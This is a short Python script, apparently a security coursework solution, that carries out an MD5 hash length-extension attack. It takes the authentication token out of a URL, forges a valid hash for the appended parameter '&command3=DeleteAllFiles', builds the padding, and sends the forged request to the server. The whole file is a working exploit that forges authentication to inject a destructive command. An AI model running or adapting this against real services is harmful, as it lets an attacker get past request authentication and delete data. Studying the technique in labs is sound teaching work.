import httplib, urlparse, sys
import urllib

try:
	from pymd5 import md5, padding
except:
	sys.exit("Please traverse to the directory having pymd5")

try:
	url = sys.argv[1]
except:
	sys.exit("Please provide input URL")	

#Extracting the original hash from the url token
token = url[url.index("token=")+len("token="):url.index("&user")]

#Using length extension to find has of longer string
newtoken = md5(state = token.decode("hex"), count=512)
appendstring = "&command3=DeleteAllFiles"
newtoken.update(appendstring)
newtoken = newtoken.hexdigest()

#Computing padding
padding = urllib.quote(padding((8+len(url[url.index("user"):]))*8))

#Updated URL
url = url[:url.index("token=")+len("token=")]+newtoken + url[url.index("&user"):]+ padding + appendstring

parsedUrl = urlparse.urlparse(url)
conn = httplib.HTTPSConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
